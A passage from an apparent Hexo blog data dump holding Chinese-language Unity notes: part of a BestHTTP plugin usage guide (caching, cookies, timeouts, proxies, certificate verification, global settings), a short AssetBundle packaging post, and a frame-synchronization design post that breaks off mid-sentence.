<strong><em>(这段话的意思相当于本地数据缓存,请求服务器,不会真的连接服务器,会从本地取出原来已经请求过的数据,只要这个数据没有过期,则直接返回给使用者)</em></strong></p>\n<p>虽然缓存是自动的，但我们可以控制它，或者我们可以使用HTTPCacheService类的公共函数获取一些信息：</p>\n<blockquote>\n<blockquote>\n<blockquote>\n</blockquote>\n<pre><code>    1):BeginClear(),它将开始在单独的线程上清除整个缓存\n    2):BeginMaintainence(),有了这个函数的帮助，我们可以根据上次访问时间删除缓存的条目。它删除上次访问时间早于指定时间的条目。我们还可以使用此函数来控制缓存大小：\n            HTTPCacheService.BeginMaintainence(new HTTPCacheMaintananceParams(TimeSpan.FromDays(14), 50 * 1024 * 1024)); \n    3):GetCacheSize(),将以字节为单位返回缓存的大小。\n    4):GetCacheEntryCount(),将返回缓存中存储的条目数。可以使用float avgSize = GetCacheSize()/（float）GetCacheEntryCount()公式计算平均缓存条目大小。</code></pre><blockquote>\n</blockquote>\n</blockquote>\n</blockquote>\n<ul>\n<li>9:Cookie ,处理cookie操作对程序员来说是透明的。设置请求Cookie标头以及解析和维护响应的Set-Cookie标头由插件自动完成。有很多关于cookie的Global Settings 。有关详细信息，请参阅 <a href=\"#13\">Global Settings</a> 部分。<br>它可以以各种方式控制</li>\n</ul>\n<blockquote>\n<blockquote>\n<blockquote>\n</blockquote>\n<pre><code>    1):使用每一次的请求对象HTTPRequest.IsCookiesEnabled属性以及全局的HTTPManager.IsCookiesEnabled属性来禁用\n    2):可以通过调用CookieJar.Clear()函数从Cookie Jar中删除Cookie\n    3):可以通过响应的Cookies属性访问从服务器发送的新cookie。</code></pre><blockquote>\n</blockquote>\n</blockquote>\n</blockquote>\n<p>可以通过将Cookie添加到Cookie列表中将Cookie添加到HTTPRequest：</p>\n<pre><code>        var request = new HTTPRequest(new Uri(address), OnFinished);\n        request.Cookies.Add(new Cookie(&quot;Name&quot;, &quot;Value&quot;)); \n        request.Send(); \n</code></pre><p>这些cookie将与服务器发送的cookie合并。如果在请求或HTTPManager中将IsCookiesEnabled设置为false，则仅发送这些用户设置的cookie</p>\n<ul>\n<li>10:代理,HTTPProxy对象可以设置为HTTPRequest的Proxy属性。这样，请求将通过给定的代理。</li>\n</ul>\n<pre><code>        request.Proxy = new HTTPProxy(new Uri(&quot;http://localhost:3128&quot;)); \n</code></pre><p>您也可以设置全局代理，因此您不必手动将其设置为所有请求。请参阅<a href=\"#13\">Global Settings</a>一章</p>\n<ul>\n<li>11:终止请求,您可以通过调用HTTPRequest对象的Abort（）函数来中止正在进行的请求</li>\n</ul>\n<pre><code>        request = new HTTPRequest(new Uri(&quot;http://yourserver.com/bigfile&quot;), (req, resp) =&gt; { ... }); \n        request.Send(); \n        // And after some time: \n        request.Abort(); //将调用回调函数，并且响应对象(resp)将为null。</code></pre><ul>\n<li>12:超时,2 种情况,第一种是:ConnectTimeout,使用此属性，您可以控制等待在应用程序和远程服务器之间建立连接的时间。其默认值为20秒</li>\n</ul>\n<pre><code>        request = new HTTPRequest(new Uri(&quot;http://yourserver.com/&quot;), (req, resp) =&gt; { ... }); \n        request.ConnectTimeout = TimeSpan.FromSeconds(2); \n        request.Send(); \n</code></pre><p>第二种:Timeout 使用此属性，您可以控制等待处理请求的时间（此时已连接到服务器,正在等待服务器响应,发送请求和下载响应）。其默认值为60秒。</p>\n<pre><code>        request = new HTTPRequest(new Uri(&quot;http://yourserver.com/&quot;), (req, resp) =&gt; { ... }); \n        request.Timeout = TimeSpan.FromSeconds(10); \n        request.Send(); \n\n\n\n        string url = &quot;http://besthttp.azurewebsites.net/api/LeaderboardTest?from=0&amp;count=10&quot;; \n        HTTPRequest request = new HTTPRequest(new Uri(url), (req, resp) =&gt; \n        { \n                switch (req.State) \n                { \n                        // The request finished without any problem. \n                        case HTTPRequestStates.Finished: \n                                Debug.Log(&quot;Request Finished Successfully!\\n&quot; + resp.DataAsText); \n                                break; \n                                // The request finished with an unexpected error. \n                        // The request&#39;s Exception property may contain more information about the error. \n                        case HTTPRequestStates.Error: \n                                Debug.LogError(&quot;Request Finished with Error! &quot; + (req.Exception != null ? (req.Exception.Message + &quot;\\n&quot; + req.Exception.StackTrace) : &quot;No Exception&quot;)); \n                        break; \n                        // The request aborted, initiated by the user. \n                        case HTTPRequestStates.Aborted: \n                                Debug.LogWarning(&quot;Request Aborted!&quot;); \n                        break; \n                        // Ceonnecting to the server timed out. \n                        case HTTPRequestStates.ConnectionTimedOut: \n                                Debug.LogError(&quot;Connection Timed Out!&quot;); \n                        break; \n                        // The request didn&#39;t finished in the given time. \n                        case HTTPRequestStates.TimedOut: \n                                Debug.LogError(&quot;Processing the request Timed Out!&quot;); break; \n                } \n        }); \n        // Very little time, for testing purposes: \n        request.ConnectTimeout = TimeSpan.FromMilliseconds(2); \n        request.Timeout = TimeSpan.FromSeconds(5); \n        request.IsKeepAlive = false; \n        request.DisableCache = true; \n        request.Send(); \n</code></pre><ul>\n<li>13:Request States 请求状态,所有请求都有一个包含其内部状态的State属性。可能的状态如下：</li>\n</ul>\n<blockquote>\n<blockquote>\n<blockquote>\n</blockquote>\n<pre><code>    1):Initial:请求的初始状态。使用此状态不会调用任何回调\n    2):Queued:在队列中等待处理。使用此状态不会调用任何回调\n    3):Processing:开始处理请求。在此状态下，客户端将发送请求，并解析响应。使用此状态不会调用任何回调。\n    4):Finished:请求完成没有问题。解析完成的响应后，可以使用结果。将使用有效的响应对象调用用户定义的回调。请求的Exception属性将为null。\n    5):Error:请求在插件中以意外错误结束。将使用null响应对象调用用户定义的回调。请求的Exception属性可能包含有关错误的更多信息，但它可以为null。\n    6):Aborted: 请求由客户端中止（HTTPRequest的Abort（）函数）。将使用null响应调用用户定义的回调。请求的Exception属性将为null。\n    7):ConnectionTimedOut：连接到服务器超时。将使用null响应调用用户定义的回调。请求的Exception属性将为null。\n    8):TimedOut：请求未在给定时间内完成。将使用null响应调用用户定义的回调。请求的Exception属性将为null。</code></pre><blockquote>\n</blockquote>\n</blockquote>\n</blockquote>\n<ul>\n<li>14:请求的优先级Request Priority ,可以通过HTTPRequest的Priority属性更改请求的优先级。与较低优先级请求相比，将从请求队列中选择更高优先级的请求。</li>\n</ul>\n<pre><code>        var request = new HTTPRequest(new Uri(&quot;https://google.com&quot;), ...);\n        request.Priority = -1; \n        request.Send(); \n</code></pre><ul>\n<li>15:服务器证书验证,Server Certificate  Validation 可以通过实现ICertificateVerifyer接口并将其设置为HTTPRequest的CustomCertificateVerifyer来验证服务器发送的证书：</li>\n</ul>\n<pre><code>        using System; \n        using Org.BouncyCastle.Crypto.Tls; \n        using Org.BouncyCastle.Asn1.X509; \n        class CustomVerifier : ICertificateVerifyer \n        { \n                public bool IsValid(Uri serverUri, X509CertificateStructure[] certs) \n                { \n                // TODO: Return false, if validation fails return true; \n                } \n        } \n        var request = new HTTPRequest(new Uri(&quot;https://google.com&quot;), ...);\n        request.CustomCertificateVerifyer = new CustomVerifier(); \n        request.UseAlternateSSL = true; \n        request.Send(); \n\n</code></pre><ul>\n<li>16:控制重定向,Control Redirections ,重定向由插件自动处理，但有时我们必须在向我们重定向到的uri发出新请求之前进行更改。我们可以在HTTPRequest的OnBeforeRedirection事件处理程序中进行这些更改。在插件向新uri发出新请求之前调用此事件。函数的返回值将控制重定向：如果为false，则重定向将被中止,子线程中调用</li>\n</ul>\n<pre><code>        var request = new HTTPRequest(uri, HTTPMethods.Post); \n        request.AddField(&quot;field&quot;, &quot;data&quot;); \n        request.OnBeforeRedirection += OnBeforeRedirect; \n        request.Send(); \n        bool OnBeforeRedirect(HTTPRequest req, HTTPResponse resp, Uri redirectUri) \n        { \n                if (req.MethodType == HTTPMethods.Post &amp;&amp; resp.StatusCode == 302) \n                { \n                        req.MethodType = HTTPMethods.Get; \n                        // Don&#39;t send more data than needed. \n                        // So we will delete our already processed form data.\n                        req.Clear(); \n                } \n                return true; \n        } </code></pre><ul>\n<li>17:统计(Statistics),您可以使用HTTPManager.GetGeneralStatistics函数获取有关底层插件的一些统计信息：</li>\n</ul>\n<pre><code>        GeneralStatistics stats = HTTPManager.GetGeneralStatistics(StatisticsQueryFlags.All); Debug.Log(stats.ActiveConnections); \n</code></pre><blockquote>\n<blockquote>\n<blockquote>\n</blockquote>\n<pre><code>    1):Connections：将返回基于连接的统计信息。这些是以下内容：\n            A:RequestsInQueue：队列中等待空闲连接的请求数。\n            B:Connections：插件跟踪的HTTPConnection实例数。这是以下所有连接的总和\n            B:ActiveConnections：活动连接数。这些连接当前正在处理请求。\n            C:FreeConnections：免费连接数。这些连接完成了请求，他们正在等待另一个请求或回收。\n            D:RecycledConnections：回收连接数。这些连接将尽快删除。\n    2):Cache：基于缓存的统计信息这些是以下内容：\n            A:CacheEntityCount：缓存响应的数量。\n            B:CacheSize：缓存响应的总和大小\n    3):Cookie：基于Cookie的统计信息。这些是以下内容\n            A:CookieCount：Cookie Jar中的Cookie数量\n            B:CookieJarSize：Cookie Jar中Cookie的总和大小</code></pre><blockquote>\n</blockquote>\n</blockquote>\n</blockquote>\n<h2 id=\"Global-Settings\"><a href=\"#Global-Settings\" class=\"headerlink\" title=\"Global Settings\"></a>Global Settings</h2><ul>\n<li>1:使用以下属性，我们可以更改一些默认值，否则应在HTTPRequest的构造函数中指定。因此，大多数这些属性都是节省时间的快捷方式。</li>\n<li>2:这些更改将影响其值更改后创建的所有请求。可以通过HTTPManager类的静态属性更改默认值:</li>\n</ul>\n<blockquote>\n<blockquote>\n<blockquote>\n</blockquote>\n<pre><code>    1):MaxConnectionPerServer：允许唯一主机的连接数。 http://example.org和https://example.org被视为两个独立的服务器。默认值为4。\n    2):KeepAliveDefaultValue：HTTPRequest的IsKeepAlive属性的默认值。如果IsKeepAlive为false，则将在每个请求之前设置与服务器的tcp连接，并在其之后立即关闭。如果连续请求很少，则应将其更改为false。赋予HTTPRequest构造函数的值将仅覆盖此请求的此值。默认值是true。\n    3):IsCachingDisabled：使用此属性，我们可以全局禁用或启用缓存服务。赋予HTTPRequest构造函数的值将仅覆盖此请求的此值。默认值是true。\n    4):MaxConnectionIdleTime：指定BestHTTP在完成最后一次请求后销毁连接之前应等待的空闲时间。默认值为2分钟。\n    5):IsCookiesEnabled：使用此选项，可以启用或禁用所有Cookie操作。默认值是true。\n    6):CookieJarSize：使用此选项可以控制Cookie存储的大小。默认值为10485760（10 MB）.\n    7):EnablePrivateBrowsing：如果启用此选项，则不会将Cookie写入磁盘。默认值为false\n    8):ConnectTimeout：使用此选项，您可以设置HTTPRequests的默认ConnectTimeout值。默认值为20秒。\n    9):RequestTimeout：使用此选项，您可以设置HTTPRequests.Timeout的默认超时值。默认值为60秒。\n    10):RootCacheFolderProvider：默认情况下，插件会将所有缓存和cookie数据保存在Application.persistentDataPath返回的路径下。您可以为此委托指定一个函数，以返回自定义根路径以定义新路径。这个代理将在子线程上调用！\n    11):Proxy：所有HTTPRequests的全局默认代理。 HTTPRequest的代理仍然可以按请求进行更改。默认值为null\n    12):Logger：ILogger实现，能够控制将记录有关插件内部的信息，以及如何记录这些信息\n    13):DefaultCertificateVerifyer：可以将ICertificateVerifyer实现设置为此属性。之后创建的所有新请求将在使用安全协议且请求的UseAlternateSSL为true时使用此验证程序。 ICertificateVerifyer实现可用于实现服务器证书验证。\n    14):UseAlternateSSLDefaultValue：可以通过此属性更改HTTPRequest的UseAlternateSSL的默认值。\n    15):HTTPManager.MaxConnectionPerServer = 10; HTTPManager.RequestTimeout = TimeSpan.FromSeconds(120); </code></pre><blockquote>\n</blockquote>\n</blockquote>\n</blockquote>\n<h2 id=\"关于线程\"><a href=\"#关于线程\" class=\"headerlink\" title=\"关于线程\"></a>关于线程</h2><ul>\n<li>1:因为插件内部使用线程并行处理所有请求，所以所有共享资源（缓存，cookie等）都是在设计和实现线程安全时考虑的。</li>\n<li>2:调用请求的回调函数和所有其他回调（如WebSocket的回调）都是在Unity的主线程上回调（如Unity的事件：awake, start, update, etc），因此您不必进行任何线程同步。</li>\n<li>3:在多个线程上创建，发送请求也是安全的，但是你应该调用BestHTTP.HTTPManager.Setup();在从Unity的一个事件（例如，awake，start）发送任何请求之前发挥作用。</li>\n</ul>\n"},{"title":"AssetBundle 打包策略","date":"2020-05-08T03:41:32.000Z","_content":"\n# 简单打包\n\n* 1 直接将数据打包到 Assets/StreamingAssets/ 文件夹下面\n```\n        BuildPipeline.BuildAssetBundles(Application.streamingAssetsPath, \"GameStart\", \n                                        EditorUserBuildSettings.activeBuildTarget, \n                                        BuildOptions.CompressWithLz4HC);\n```\n\n* 2 自定义打包策略(一律纯小写,无数字)\n> 1. 建立一个 ScriptableObject ,设置不同类型的文件路径,类型分为:prefab,scene,fbx,shader,sound,bytes,xml,json等等\n> 2. 根据依赖关系生成不冗余的 ab 包 (AssetDatabase.GetDependencies)\n> 3. 生成自己的依赖关系表 \n> 4. 根据自己的依赖关系表加载 ab 包\n> 5. 多个资源可以设置同一个 ab 的名字;多个资源可以打成一个 ab 包,ab 的资源名字也是文件名字,后缀名一般跟.ab 或者.unity3d;\n>> ab 名字是 abc                \n>> ab 包,打成的文件名字是 abc.ab                \n>> ab 包中的资源有图片,音频,mesh,prefab,脚本,等等               \n\n* 3 打包","source":"_posts/Unity/AssetBundles/打包策略.md","raw":"---\ntitle: AssetBundle 打包策略\ndate: 2020-05-08 11:41:32\ncategories:\n- Unity\ntags:\n- Unity\n---\n\n# 简单打包\n\n* 1 直接将数据打包到 Assets/StreamingAssets/ 文件夹下面\n```\n        BuildPipeline.BuildAssetBundles(Application.streamingAssetsPath, \"GameStart\", \n                                        EditorUserBuildSettings.activeBuildTarget, \n                                        BuildOptions.CompressWithLz4HC);\n```\n\n* 2 自定义打包策略(一律纯小写,无数字)\n> 1. 建立一个 ScriptableObject ,设置不同类型的文件路径,类型分为:prefab,scene,fbx,shader,sound,bytes,xml,json等等\n> 2. 根据依赖关系生成不冗余的 ab 包 (AssetDatabase.GetDependencies)\n> 3. 生成自己的依赖关系表 \n> 4. 根据自己的依赖关系表加载 ab 包\n> 5. 多个资源可以设置同一个 ab 的名字;多个资源可以打成一个 ab 包,ab 的资源名字也是文件名字,后缀名一般跟.ab 或者.unity3d;\n>> ab 名字是 abc                \n>> ab 包,打成的文件名字是 abc.ab                \n>> ab 包中的资源有图片,音频,mesh,prefab,脚本,等等               \n\n* 3 打包","slug":"Unity/AssetBundles/打包策略","published":1,"updated":"2020-07-28T09:01:45.270Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckfvz8czr002n2gk74mwe6sjc","content":"<h1 id=\"简单打包\"><a href=\"#简单打包\" class=\"headerlink\" title=\"简单打包\"></a>简单打包</h1><ul>\n<li><p>1 直接将数据打包到 Assets/StreamingAssets/ 文件夹下面</p>\n<pre><code>      BuildPipeline.BuildAssetBundles(Application.streamingAssetsPath, &quot;GameStart&quot;, \n                                      EditorUserBuildSettings.activeBuildTarget, \n                                      BuildOptions.CompressWithLz4HC);</code></pre></li>\n<li><p>2 自定义打包策略(一律纯小写,无数字)</p>\n<blockquote>\n<ol>\n<li>建立一个 ScriptableObject ,设置不同类型的文件路径,类型分为:prefab,scene,fbx,shader,sound,bytes,xml,json等等</li>\n<li>根据依赖关系生成不冗余的 ab 包 (AssetDatabase.GetDependencies)</li>\n<li>生成自己的依赖关系表 </li>\n<li>根据自己的依赖关系表加载 ab 包</li>\n<li>多个资源可以设置同一个 ab 的名字;多个资源可以打成一个 ab 包,ab 的资源名字也是文件名字,后缀名一般跟.ab 或者.unity3d;<blockquote>\n<p>ab 名字是 abc<br>ab 包,打成的文件名字是 abc.ab<br>ab 包中的资源有图片,音频,mesh,prefab,脚本,等等               </p>\n</blockquote>\n</li>\n</ol>\n</blockquote>\n</li>\n<li><p>3 打包</p>\n</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"简单打包\"><a href=\"#简单打包\" class=\"headerlink\" title=\"简单打包\"></a>简单打包</h1><ul>\n<li><p>1 直接将数据打包到 Assets/StreamingAssets/ 文件夹下面</p>\n<pre><code>      BuildPipeline.BuildAssetBundles(Application.streamingAssetsPath, &quot;GameStart&quot;, \n                                      EditorUserBuildSettings.activeBuildTarget, \n                                      BuildOptions.CompressWithLz4HC);</code></pre></li>\n<li><p>2 自定义打包策略(一律纯小写,无数字)</p>\n<blockquote>\n<ol>\n<li>建立一个 ScriptableObject ,设置不同类型的文件路径,类型分为:prefab,scene,fbx,shader,sound,bytes,xml,json等等</li>\n<li>根据依赖关系生成不冗余的 ab 包 (AssetDatabase.GetDependencies)</li>\n<li>生成自己的依赖关系表 </li>\n<li>根据自己的依赖关系表加载 ab 包</li>\n<li>多个资源可以设置同一个 ab 的名字;多个资源可以打成一个 ab 包,ab 的资源名字也是文件名字,后缀名一般跟.ab 或者.unity3d;<blockquote>\n<p>ab 名字是 abc<br>ab 包,打成的文件名字是 abc.ab<br>ab 包中的资源有图片,音频,mesh,prefab,脚本,等等               </p>\n</blockquote>\n</li>\n</ol>\n</blockquote>\n</li>\n<li><p>3 打包</p>\n</li>\n</ul>\n"},{"title":"帧同步","date":"2020-05-11T03:41:32.000Z","top":1,"_content":"\n# 帧同步\n\n\n## 介绍\n\n* 1:逻辑在客户端实现,服务器主要负责广播和验证操作,逻辑直观,数据量小,可重播\n* 2:客户端上传操作,服务器收集,固定频率广播收到的数据,不在乎客户端是否上传成功,不影响其他客户端的表现.\n* 3:最重要的概念: ***相同输入，经过相同计算过程，得出相同计算结果*** ,运行结果不与硬件运行速度快慢相关联.需要注意的是,不能使用 unity3d 自带的系统 API,例如Time类/Invoke函数/脚本的方法/物理引擎/协程,因为会造成不同步.需要自己开线程使用固定的时间片段进帧数据操作,逻辑帧执行的次数是恒定的.\n* 4:需求以及要求:高一致性,低流量消耗,多人实时性,战斗回放功能,加速功能,服务器同步逻辑校验防作弊,服务器逻辑简化,弱网络环境,\n* 5:逻辑帧固定为0.033(即 1 秒 30 逻辑帧),渲染帧设定为60(update 里面最大可以1s 跑 60 次),如果CPU 运行不过来,update 执行次数会降低.卡顿以及丢帧:是因为逻辑帧跑了很多帧之后,渲染帧才执行了一帧.\n* 6:[核心文章1](https://blog.csdn.net/qq_18536721/article/details/52713564) [核心文章2](https://blog.csdn.net/game_jqd/article/details/72870289)\n\n## 帧数据\n\n* 1:关键帧.服务器按固定频率广播的操作数据帧，使用唯一ID标识，主要包括客户端输入数据或服务器发送的关键信息(例如游戏战斗开始或结束等消息),网络数据.\n* 2:填充帧.由于设备性能和网络延迟等原因,服务器广播频率不可能达到客户端的更新频率,若只使用关键帧来驱动游戏运作，就会造成游戏卡顿，影响体验.因此，除关键帧外，客户端需要自行添加若干空数据帧，以使游戏表现更为流畅.网络数据或者本地伪造数据.\n* 3:逻辑帧:客户端执行一帧所需时间，可根据设备性能和网络环境等因素动态变化.\n* 4:服务器帧更新时间：服务器广播帧数据的固定频率，一般用于帧间隔时间差的逻辑计算(一般情况下 0.033(即 1 秒 30 逻辑帧) 足够)\n\n## 插件选择与使用方式\n* 1:定点数和浮点数，是指在计算机中一个数的小数点的位置是固定的还是浮动的,如果一个数中小数点的位置是固定的，则为定点数；如果一个数中小数点的位置是浮动的，则为浮点数。定点数由于小数点的位置固定,因此其精度可控,相反浮点数的精度不可控.\n* 2:unity 自带的 float/Vector2/Vector3/Vector4都不要使用,要使用框架Fix定点数来替换使用\n* 3:关于需要使用核心动画的,都不能使用Dotween插件做动画,因为Dotween插件使用的是Time.deltaTime做插值的,不是使用逻辑时长做插值的,因为在不重要的地方做动画是可以的.\n* 随机数,随机数种子最好由服务器发送,然后随机数选择一个库来使用,保证每个客户端的随机数相同\n\n## 数据计算\n* 1:需要计算的顺序必须保持一致,unity的update不可控,需要自己开线程定时 0.033s/f (即 1 秒 30 逻辑帧)计算,保证顺序一致,\n* 2:需要明确各个客户端计算结果都必须一致才正确,如果计算不正确就是bug.凡是遇到计算全部转成定点数进行计算,并且由服务器发送随机数种子.\n* 3:帧时间:当前帧序列数*服务器帧更新时间/(填充帧数 + 1),每帧随机数计算都由服务器下发种子来控制.\n* 4:帧同步伤害算法.\n\n## 网络\n\n* 1:大多数情况下网络是波动的,接收/发送的数据频率是不稳定的.客户端需要等到逻辑帧返回才可以进行下一步.\n* 2:做一个逻辑帧缓冲区,设置上限,当存入缓存区的帧数据满足上限之后,按照固定频率播放.出现延迟,则填入逻辑帧缓冲区,然后平均分布到固定的频率中去,平滑处理网络波动造成的卡顿\n* 3:丢帧,采用 UDP(KCP) 进行传输.关键帧里面携带前 2 帧的数据,大大降低帧数据丢失率,同时需要削减包的大小.每个包不要超过 576 byte(一个MTU以下).\n* 4:实测情况下,最坏可能要 24kb/s 的速度,这个速度很难稳定达到\n\n## 渲染层\n\n* 1:加速功能,Time.timeScale = 2/1.5/1/0.5;等.计算时需要根据机子性能进行加速调整,因为CPU就是那压力过大,会出现卡顿和跳帧\n* 2:战斗回放功能,因为关键帧记录,以及关键帧计算的结果都是一致的,所以最后将关键帧数据回放并计算就是正确的回放\n\n## 服务器\n\n* 1:服务器只处理逻辑,这就要客户端需要将逻辑与渲染分开,客户端采用线程处理逻辑部分,主线程处理渲染部分.\n* 2:同一份代码如果都是用 C#写的话,需要区分客户端还是服务器代码使用宏定义可以很好的区别\n* 3:c#核心代码的编写需要另开一个库进行,版本容易管理,需要将 Log/Time/存储 等类进行重写以适配客户端和服务器\n* 4:\n","source":"_posts/Unity/FrameSynchronization/FrameSync.md","raw":"---\ntitle: 帧同步\ndate: 2020-05-11 11:41:32\ntop: 1\ncategories:\n- Unity\ntags:\n- Unity\n---\n\n# 帧同步\n\n\n## 介绍\n\n* 1:逻辑在客户端实现,服务器主要负责广播和验证操作,逻辑直观,数据量小,可重播\n* 2:客户端上传操作,服务器收集,固定频率广播收到的数据,不在乎客户端是否上传成功,不影响其他客户端的表现.\n* 3:最重要的概念: ***相同输入，经过相同计算过程，得出相同计算结果*** ,运行结果不与硬件运行速度快慢相关联.需要注意的是,不能使用 unity3d 自带的系统 API,例如Time类/Invoke函数/脚本的方法/物理引擎/协程,因为会造成不同步.需要自己开线程使用固定的时间片段进帧数据操作,逻辑帧执行的次数是恒定的.\n* 4:需求以及要求:高一致性,低流量消耗,多人实时性,战斗回放功能,加速功能,服务器同步逻辑校验防作弊,服务器逻辑简化,弱网络环境,\n* 5:逻辑帧固定为0.033(即 1 秒 30 逻辑帧),渲染帧设定为60(update 里面最大可以1s 跑 60 次),如果CPU 运行不过来,update 执行次数会降低.卡顿以及丢帧:是因为逻辑帧跑了很多帧之后,渲染帧才执行了一帧.\n* 6:[核心文章1](https://blog.csdn.net/qq_18536721/article/details/52713564) [核心文章2](https://blog.csdn.net/game_jqd/article/details/72870289)\n\n## 帧数据\n\n* 1:关键帧.服务器按固定频率广播的操作数据帧，使用唯一ID标识，主要包括客户端输入数据或服务器发送的关键信息(例如游戏战斗开始或结束等消息),网络数据.\n* 2:填充帧.由于设备性能和网络延迟等原因,服务器广播频率不可能达到客户端的更新频率,若只使用关键帧来驱动游戏运作，就会造成游戏卡顿，影响体验.因此，除关键帧外，客户端需要自行添加若干空数据帧，以使游戏表现更为流畅.网络数据或者本地伪造数据.\n* 3:逻辑帧:客户端执行一帧所需时间，可根据设备性能和网络环境等因素动态变化.\n* 4:服务器帧更新时间：服务器广播帧数据的固定频率，一般用于帧间隔时间差的逻辑计算(一般情况下 0.033(即 1 秒 30 逻辑帧) 足够)\n\n## 插件选择与使用方式\n* 1:定点数和浮点数，是指在计算机中一个数的小数点的位置是固定的还是浮动的,如果一个数中小数点的位置是固定的，则为定点数；如果一个数中小数点的位置是浮动的，则为浮点数。定点数由于小数点的位置固定,因此其精度可控,相反浮点数的精度不可控.\n* 2:unity 自带的 float/Vector2/Vector3/Vector4都不要使用,要使用框架Fix定点数来替换使用\n* 3:关于需要使用核心动画的,都不能使用Dotween插件做动画,因为Dotween插件使用的是Time.deltaTime做插值的,不是使用逻辑时长做插值的,因为在不重要的地方做动画是可以的.\n* 随机数,随机数种子最好由服务器发送,然后随机数选择一个库来使用,保证每个客户端的随机数相同\n\n## 数据计算\n* 1:需要计算的顺序必须保持一致,unity的update不可控,需要自己开线程定时 0.033s/f (即 1 秒 30 逻辑帧)计算,保证顺序一致,\n* 2:需要明确各个客户端计算结果都必须一致才正确,如果计算不正确就是bug.凡是遇到计算全部转成定点数进行计算,并且由服务器发送随机数种子.\n* 3:帧时间:当前帧序列数*服务器帧更新时间/(填充帧数 + 1),每帧随机数计算都由服务器下发种子来控制.\n* 4:帧同步伤害算法.\n\n## 网络\n\n* 1:大多数情况下网络是波动的,接收/发送的数据频率是不稳定的.客户端需要等到逻辑帧返回才可以进行下一步.\n* 2:做一个逻辑帧缓冲区,设置上限,当存入缓存区的帧数据满足上限之后,按照固定频率播放.出现延迟,则填入逻辑帧缓冲区,然后平均分布到固定的频率中去,平滑处理网络波动造成的卡顿\n* 3:丢帧,采用 UDP(KCP) 进行传输.关键帧里面携带前 2 帧的数据,大大降低帧数据丢失率,同时需要削减包的大小.每个包不要超过 576 byte(一个MTU以下).\n* 4:实测情况下,最坏可能要 24kb/s 的速度,这个速度很难稳定达到\n\n## 渲染层\n\n* 1:加速功能,Time.timeScale = 2/1.5/1/0.5;等.计算时需要根据机子性能进行加速调整,因为CPU就是那压力过大,会出现卡顿和跳帧\n* 2:战斗回放功能,因为关键帧记录,以及关键帧计算的结果都是一致的,所以最后将关键帧数据回放并计算就是正确的回放\n\n## 服务器\n\n* 1:服务器只处理逻辑,这就要客户端需要将逻辑与渲染分开,客户端采用线程处理逻辑部分,主线程处理渲染部分.\n* 2:同一份代码如果都是用 C#写的话,需要区分客户端还是服务器代码使用宏定义可以很好的区别\n* 3:c#核心代码的编写需要另开一个库进行,版本容易管理,需要将 Log/Time/存储 等类进行重写以适配客户端和服务器\n* 4:\n","slug":"Unity/FrameSynchronization/FrameSync","published":1,"updated":"2020-05-15T02:57:43.042Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckfvz8czv002o2gk7an2c4j5q","content":"<h1 id=\"帧同步\"><a href=\"#帧同步\" class=\"headerlink\" title=\"帧同步\"></a>帧同步</h1><h2 id=\"介绍\"><a href=\"#介绍\" class=\"headerlink\" title=\"介绍\"></a>介绍</h2><ul>\n<li>1:逻辑在客户端实现,服务器主要负责广播和验证操作,逻辑直观,数据量小,可重播</li>\n<li>2:客户端上传操作,服务器收集,固定频率广播收到的数据,不在乎客户端是否上传成功,不影响其他客户端的表现.</li>\n<li>3:最重要的概念: <strong><em>相同输入，经过相同计算过程，得出相同计算结果</em></strong> ,运行结果不与硬件运行速度快慢相关联.需要注意的是,不能使用 unity3d 自带的系统 API,例如Time类/Invoke函数/脚本的方法/物理引擎/协程,因为会造成不同步.需要自己开线程使用固定的时间片段进帧数据操作,逻辑帧执行的次数是恒定的.</li>\n<li>4:需求以及要求:高一致性,低流量消耗,多人实时性,战斗回放功能,加速功能,服务器同步逻辑校验防作弊,服务器逻辑简化,弱网络环境,</li>\n<li>5:逻辑帧固定为0.033(即 1 秒 30 逻辑帧),渲染帧设定为60(update 里面最大可以1s 跑 60 次),如果CPU 运行不过来,update 执行次数会降低.卡顿以及丢帧:是因为逻辑帧跑了很多帧之后,渲染帧才执行了一帧.</li>\n<li>6:<a href=\"https://blog.csdn.net/qq_18536721/article/details/52713564\" target=\"_blank\" rel=\"noopener\">核心文章1</a> <a href=\"https://blog.csdn.net/game_jqd/article/details/72870289\" target=\"_blank\" rel=\"noopener\">核心文章2</a></li>\n</ul>\n<h2 id=\"帧数据\"><a href=\"#帧数据\" class=\"headerlink\" title=\"帧数据\"></a>帧数据</h2><ul>\n<li>1:关键帧.服务器按固定频率广播的操作数据帧，使用唯一ID标识，主要包括客户端输入数据或服务器发送的关键信息(例如游戏战斗开始或结束等消息),网络数据.</li>\n<li>2:填充帧.由于设备性能和网络延迟等原因,服务器广播频率不可能达到客户端的更新频率,若只使用关键帧来驱动游戏运作，就会造成游戏卡顿，影响体验.因此，除关键帧外，客户端需要自行添加若干空数据帧，以使游戏表现更为流畅.网络数据或者本地伪造数据.</li>\n<li>3:逻辑帧:客户端执行一帧所需时间，可根据设备性能和网络环境等因素动态变化.</li>\n<li>4:服务器帧更新时间：服务器广播帧数据的固定频率，一般用于帧间隔时间差的逻辑计算(一般情况下 0.033(即 1 秒 30 逻辑帧) 足够)</li>\n</ul>\n<h2 id=\"插件选择与使用方式\"><a href=\"#插件选择与使用方式\" class=\"headerlink\" title=\"插件选择与使用方式\"></a>插件选择与使用方式</h2><ul>\n<li>1:定点数和浮点数，是指在计算机中一个数的小数点的位置是固定的还是浮动的,如果一个数中小数点的位置是固定的，则为定点数；如果一个数中小数点的位置是浮动的，则为浮点数。定点数由于小数点的位置固定,因此其精度可控,相反浮点数的精度不可控.</li>\n<li>2:unity 自带的 float/Vector2/Vector3/Vector4都不要使用,要使用框架Fix定点数来替换使用</li>\n<li>3:关于需要使用核心动画的,都不能使用Dotween插件做动画,因为Dotween插件使用的是Time.deltaTime做插值的,不是使用逻辑时长做插值的,因为在不重要的地方做动画是可以的.</li>\n<li>随机数,随机数种子最好由服务器发送,然后随机数选择一个库来使用,保证每个客户端的随机数相同</li>\n</ul>\n<h2 id=\"数据计算\"><a href=\"#数据计算\" class=\"headerlink\" title=\"数据计算\"></a>数据计算</h2><ul>\n<li>1:需要计算的顺序必须保持一致,unity的update不可控,需要自己开线程定时 0.033s/f (即 1 秒 30 逻辑帧)计算,保证顺序一致,</li>\n<li>2:需要明确各个客户端计算结果都必须一致才正确,如果计算不正确就是bug.凡是遇到计算全部转成定点数进行计算,并且由服务器发送随机数种子.</li>\n<li>3:帧时间:当前帧序列数*服务器帧更新时间/(填充帧数 + 